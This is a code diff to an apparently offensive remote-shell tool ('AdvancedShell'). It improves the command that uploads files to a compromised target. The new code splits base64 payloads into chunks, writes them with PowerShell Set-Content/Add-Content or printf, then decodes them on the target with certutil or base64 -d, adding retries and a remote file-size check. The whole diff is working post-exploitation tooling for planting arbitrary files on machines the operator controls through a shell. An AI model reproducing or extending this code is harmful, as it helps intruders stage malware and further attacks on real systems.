@@ -859,35 +859,71 @@ class AdvancedShell:
                         rp_safe=rp.replace('\\','/') if self.target_os=='windows' else rp
                         data=open(lp,'rb').read()
                         b64=base64.b64encode(data).decode()
-                        fsize=len(data);print(f"{Y}[*] Uploading {lp} → {rp_safe} ({fsize}B, {len(b64)}B base64){W}")
-                        CHUNK=1500  # base64 chars per chunk
+                        fsize=len(data)
+                        CHUNK=6000  # base64 chars per chunk (4x larger = 4x fewer requests)
                         chunks=[b64[i:i+CHUNK] for i in range(0,len(b64),CHUNK)]
+                        print(f"{Y}[*] Uploading {lp} → {rp_safe} ({fsize}B, {len(chunks)} chunks){W}")
                         if self.target_os=='windows':
                             if len(chunks)==1:
                                 o=self.execute(f'powershell -c "[IO.File]::WriteAllBytes(\'{rp_safe}\',[Convert]::FromBase64String(\'{b64}\'))"')
                             else:
+                                # Use PowerShell Set-Content/Add-Content (no \r\n corruption)
                                 tmp=rp_safe+'.b64'
+                                failed=False
                                 for i,chunk in enumerate(chunks):
-                                    op='>' if i==0 else '>>'
-                                    o=self.execute(f'echo {chunk}{op}"{tmp}"')
-                                    if o and '[-]' in o:print(f"{R}Chunk {i+1}/{len(chunks)} failed{W}");break
-                                    sys.stdout.write(f"\r  Chunk {i+1}/{len(chunks)}");sys.stdout.flush()
+                                    if i==0:
+                                        ps_cmd=f"powershell -c \"Set-Content -Path '{tmp}' -Value '{chunk}' -NoNewline\""
+                                    else:
+                                        ps_cmd=f"powershell -c \"Add-Content -Path '{tmp}' -Value '{chunk}' -NoNewline\""
+                                    # Retry up to 3 times
+                                    for attempt in range(3):
+                                        o=self.execute(ps_cmd)
+                                        if o and '[-]' in o:
+                                            if attempt<2:time.sleep(1)
+                                        else:break
+                                    else:
+                                        print(f"\n{R}Chunk {i+1}/{len(chunks)} failed after 3 retries{W}")
+                                        failed=True;break
+                                    pct=int((i+1)/len(chunks)*100)
+                                    sys.stdout.write(f"\r  [{pct:3d}%] Chunk {i+1}/{len(chunks)}");sys.stdout.flush()
                                 print()
-                                o=self.execute(f'certutil -decode "{tmp}" "{rp_safe}" & del "{tmp}"')
+                                if not failed:
+                                    o=self.execute(f'certutil -decode "{tmp}" "{rp_safe}" & del "{tmp}"')
                         else:
                             if len(chunks)==1:
                                 o=self.execute(f"echo '{b64}'|base64 -d > '{rp_safe}'")
                             else:
                                 tmp=rp_safe+'.b64'
+                                failed=False
                                 for i,chunk in enumerate(chunks):
                                     op='>' if i==0 else '>>'
-                                    o=self.execute(f"echo -n '{chunk}'{op}'{tmp}'")
-                                    if o and '[-]' in o:print(f"{R}Chunk {i+1}/{len(chunks)} failed{W}");break
-                                    sys.stdout.write(f"\r  Chunk {i+1}/{len(chunks)}");sys.stdout.flush()
+                                    for attempt in range(3):
+                                        o=self.execute(f"printf '%s' '{chunk}'{op}'{tmp}'")
+                                        if o and '[-]' in o:
+                                            if attempt<2:time.sleep(1)
+                                        else:break
+                                    else:
+                                        print(f"\n{R}Chunk {i+1}/{len(chunks)} failed after 3 retries{W}")
+                                        failed=True;break
+                                    pct=int((i+1)/len(chunks)*100)
+                                    sys.stdout.write(f"\r  [{pct:3d}%] Chunk {i+1}/{len(chunks)}");sys.stdout.flush()
                                 print()
-                                o=self.execute(f"base64 -d '{tmp}' > '{rp_safe}' && rm '{tmp}'")
-                        if o and '[-]' not in o:print(f"{G}[+] Upload complete: {rp}{W}")
-                        else:print(f"{Y}[!] Upload may have failed. Verify with: .cat {rp}{W}")
+                                if not failed:
+                                    o=self.execute(f"base64 -d '{tmp}' > '{rp_safe}' && rm '{tmp}'")
+                        if o and '[-]' not in o:
+                            # Verify file size on target
+                            if self.target_os=='windows':
+                                sz=self.execute(f'powershell -c \"(Get-Item \'{rp_safe}\').Length\"')
+                            else:
+                                sz=self.execute(f"stat -c%s '{rp_safe}' 2>/dev/null || wc -c < '{rp_safe}'")
+                            if sz:
+                                try:
+                                    remote_sz=int(sz.strip().split()[-1])
+                                    if remote_sz==fsize:print(f"{G}[+] Upload verified: {rp} ({fsize}B) ✓{W}")
+                                    else:print(f"{Y}[!] Size mismatch: local={fsize}B remote={remote_sz}B{W}")
+                                except:print(f"{G}[+] Upload complete: {rp}{W}")
+                            else:print(f"{G}[+] Upload complete: {rp}{W}")
+                        else:print(f"{Y}[!] Upload may have failed. Check with: dir {rp_safe}{W}")
                     elif cmd.startswith('.download') or cmd.startswith('.dl'):
                         p=cmd.split()
                         if len(p)<2:print("Usage: .download <remote> [local]");continue
